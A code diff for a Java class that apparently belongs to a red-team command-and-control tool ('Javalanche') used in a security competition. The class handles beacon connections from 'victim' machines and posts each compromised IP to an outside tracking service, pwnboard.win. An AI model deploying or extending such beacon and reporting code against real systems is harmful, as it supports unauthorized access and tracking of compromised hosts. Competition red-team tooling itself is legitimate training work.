@@ -4,10 +4,15 @@ import Servers.Duplexer;
 import Servers.keepAlive;
 
 import java.io.DataOutputStream;
+import java.io.EOFException;
 import java.io.IOException;
+import java.io.InputStream;
 import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
 import java.net.URI;
 import java.net.URISyntaxException;
+import java.net.URL;
+import java.util.Scanner;
 
 public class BeaconClientHandler implements Runnable{
     // IP address of the client
@@ -32,10 +37,11 @@ public class BeaconClientHandler implements Runnable{
     // Object lock used to make sure that this thread is able to safetly access the duplexer
     private Object sendLock;
 
-    // Variables to send data to Pwnboard
-    private HttpURLConnection connection;
-    private URI uri;
-    private String pwnBoardData;
+    // Variables used to send HTTP Requests to pwnboard. pwnboard is used to keep track of what machines red team still has access to.
+    URI pwnboardUri = null;
+    URL pwnboardUrl = null;
+    HttpURLConnection pwnboardConnection = null;
+    String pwnboardData;
 
     /**
      * Use this Class to create a new thread to handle each victim connection
@@ -53,13 +59,16 @@ public class BeaconClientHandler implements Runnable{
         this.sendLock = new Object();
         this.keepAliveClass = new keepAlive(this.duplexer, sendLock, true, true);
         this.keepAliveThread = new Thread(keepAliveClass);
-        this.connection = null;
+
         try{
-            this.uri = new URI("https://pwnboard.win/pwn/boxaccess");
+            this.pwnboardUri = new URI("https://pwnboard.win/pwn/boxaccess");
+            this.pwnboardUrl = this.pwnboardUri.toURL();
         } catch (URISyntaxException e){
             e.printStackTrace();
+        } catch (MalformedURLException e){
+            e.printStackTrace();
         }
-        this.pwnBoardData = "{\"ip\": " + IPAddress + ", \"application\": \"Javalanche\", \"access_type\": \"beacon\"}";
+        this.pwnboardData = "{\"ip\": \"" + IPAddress + "\", \"application\": \"Javalanche\", \"access_type\": \"beacon\"}";
     }
 
     protected void quit(String reason) throws IOException{
@@ -95,24 +104,28 @@ public class BeaconClientHandler implements Runnable{
      * This method sends a HTTP request to pwnbaord. pwnboard keeps track of what machines we have access to in the competition, so this method is called
      * Whenever a message is received from the client
      */
-    private void sendPwnBoardRequest(){
-        try{
-            // Open a connection to PWNBoard and set some basic variables
-            connection = (HttpURLConnection) uri.toURL().openConnection();
-            connection.setRequestMethod("POST");
-            connection.setRequestProperty("Content-Type", "application/json");
-            connection.setRequestProperty("Content-Length", Integer.toString(pwnBoardData.length()));
-            connection.setRequestProperty("Content-Language", "en-US");  
-            connection.setUseCaches(false);
-            connection.setDoOutput(true);
+    private void sendPwnBoardRequest() throws IOException{
+        // Connect to pwnboard
+        pwnboardConnection = (HttpURLConnection)pwnboardUrl.openConnection();
+        pwnboardConnection.setDoOutput(true);
+        pwnboardConnection.connect();
 
-            // Send Post request
-            DataOutputStream writer = new DataOutputStream(connection.getOutputStream());
-            writer.writeBytes(pwnBoardData);
-            writer.close();
-        } catch (Exception e){
-            e.printStackTrace();
+        // Send api request
+        DataOutputStream writer = new DataOutputStream(pwnboardConnection.getOutputStream());
+        
+        writer.writeBytes(pwnboardData);
+        writer.close();
+
+        // Debug lines
+        InputStream in = pwnboardConnection.getInputStream();
+        Scanner scanner = new Scanner(in);
+
+        while(scanner.hasNext()){
+            System.out.println(scanner.nextLine());
         }
+        scanner.close();
+
+        pwnboardConnection.disconnect();
     }
 
     /**
